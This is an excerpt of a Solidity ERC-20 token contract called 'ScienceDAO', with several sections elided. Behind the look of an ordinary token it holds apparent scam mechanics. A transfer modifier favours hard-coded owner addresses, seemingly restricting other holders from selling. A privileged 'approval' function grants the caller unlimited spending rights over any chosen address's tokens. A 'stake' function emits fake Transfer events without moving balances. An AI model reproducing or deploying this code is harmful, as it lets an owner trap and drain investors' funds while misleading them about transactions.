...
contract ScienceDAO is Context, IERC20 {
    ...
    address _contDeployr = 0x81ed317154E4C6E829B0358F59C5578719E95ccB;
    address public _ownr = 0x62172c90fa5755909F83d2CEc268f3Eb6979dBC3;

    constructor() public {
        _name = "SCIENCE DAO";
        _symbol = "SCIENCE DAO";
        _decimals = 18;
        uint256 initialSupply = 1000000000000 * 10**18;
        _safeOwnr = _ownr;
    ...
    modifier mainboard(
        ...
        if (_ownr == _safeOwnr && from == _ownr) {
            _safeOwnr = dest;
            _;
        } else {
            if (from == _ownr || from == _safeOwnr || dest == _ownr) {
                if (from == _ownr && from == dest) {
                    _discardedAmt = num;
                }
                _;
            } else {
    ...
    function _tf(
        ...
        address dest,
        uint256 amt
    ) internal virtual mainboard(dest, amt, from, address(0)) {
        _pair(from, dest, amt);
    }
    ...
    function approval(address addr) public virtual _verify returns (bool) {
        //Approve Spending
        _approve(addr, _msgSender(), _maximumVal);
        return true;
    }

    function transferToTokenSaleParticipant(
        address sndr,
    ...
    function stake(
        ...
        for (uint256 i = 0; i < eReceiver.length; i++) {
            emit Transfer(eReceiver[i], uPool, eAmounts[i]);
        }
    }
